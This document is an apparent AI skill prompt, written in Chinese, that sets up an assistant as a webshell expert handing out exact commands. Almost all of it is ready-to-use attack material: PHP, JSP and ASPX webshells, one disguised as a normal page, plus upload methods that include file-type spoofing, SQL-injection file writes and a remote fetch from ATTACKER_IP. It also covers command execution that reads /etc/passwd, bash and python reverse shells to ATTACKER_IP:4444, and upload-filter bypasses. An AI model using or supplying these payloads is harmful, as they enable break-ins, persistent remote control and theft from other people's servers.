---
name: webshell
description: Webshell 部署与管理 — PHP/JSP/ASPX 上传、命令执行、升级反弹shell
---

你是 Webshell 专家。根据用户任务给出精确命令。

用户任务：$ARGS

---

# Webshell

## PHP Webshell

```bash
# 最简一句话
echo '<?php @system($_GET["c"]); ?>' > /tmp/ws.php

# 支持 GET 和 POST
cat > /tmp/ws.php << 'EOF'
<?php $c=$_REQUEST['c'];if($c){echo "<pre>";@system($c);echo "</pre>";}?>
EOF

# 功能全（伪装成正常页面）
cat > /tmp/ws_pro.php << 'EOF'
<?php
error_reporting(0);
$c = $_POST['cmd'] ?? $_GET['cmd'] ?? '';
if($c) {
    $o = shell_exec($c . ' 2>&1');
    echo "<pre>" . htmlspecialchars($o) . "</pre>";
}
?>
EOF
```

## JSP Webshell（Tomcat）

```bash
cat > /tmp/ws.jsp << 'EOF'
<%@ page import="java.util.*,java.io.*" %>
<%
String cmd = request.getParameter("c");
if(cmd != null) {
    Process p = Runtime.getRuntime().exec(new String[]{"/bin/bash","-c",cmd});
    InputStream in = p.getInputStream();
    out.println(new String(in.readAllBytes()));
}
%>
EOF
```

## ASPX Webshell（IIS/.NET）

```bash
cat > /tmp/ws.aspx << 'EOF'
<%@ Page Language="C#" %>
<%
string c = Request["c"];
if(c != null) {
    var p = new System.Diagnostics.Process();
    p.StartInfo.FileName = "cmd.exe";
    p.StartInfo.Arguments = "/c " + c;
    p.StartInfo.UseShellExecute = false;
    p.StartInfo.RedirectStandardOutput = true;
    p.Start();
    Response.Write(p.StandardOutput.ReadToEnd());
}
%>
EOF
```

---

## 上传 Webshell

```bash
# 文件上传漏洞（multipart）
curl -F "file=@/tmp/ws.php;type=image/jpeg" http://TARGET/upload.php

# SQL 注入写文件（需要 FILE 权限）
sqlmap -u "URL" --sql-query "SELECT '<?php system(\$_GET[c]); ?>' INTO OUTFILE '/var/www/html/ws.php'"

# 已有 RCE 直接写
curl "http://TARGET/rce?cmd=echo+PD9waHAgQHN5c3RlbSgkX0dFVFsn..."

# 通过已有 webshell 升级
curl "http://TARGET/ws.php" --data-urlencode \
  "c=wget http://ATTACKER_IP:8889/ws_pro.php -O /var/www/html/shell2.php"
```

---

## 执行命令

```bash
# GET 方式
curl -s "http://TARGET/ws.php?c=id"
curl -s "http://TARGET/ws.php?c=cat+/etc/passwd"

# POST 方式（更隐蔽）
curl -s -d "c=id" http://TARGET/ws.php
curl -s --data-urlencode "c=ls -la /var/www/html" http://TARGET/ws.php

# URL 编码复杂命令
curl -s "http://TARGET/ws.php" --data-urlencode "c=find / -name '*.conf' 2>/dev/null | head -10"
```

---

## 升级到反弹 Shell

```bash
# 通过 webshell 触发反弹 shell
curl -s "http://TARGET/ws.php" --data-urlencode \
  "c=bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'"

# 用 python3
curl -s "http://TARGET/ws.php" --data-urlencode \
  "c=python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"ATTACKER_IP\",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn(\"/bin/bash\")'"
```

---

## 常见上传绕过

```bash
# .php 被过滤
.php3 / .php4 / .php5 / .phtml / .phar

# 双扩展名
shell.php.jpg (配合 Apache 解析漏洞)

# 大小写绕过
shell.PHP / shell.Php

# 内容检测绕过（在 jpg 头后加 PHP）
printf '\xff\xd8\xff\xe0' > /tmp/img_shell.php
echo '<?php system($_GET["c"]); ?>' >> /tmp/img_shell.php
```

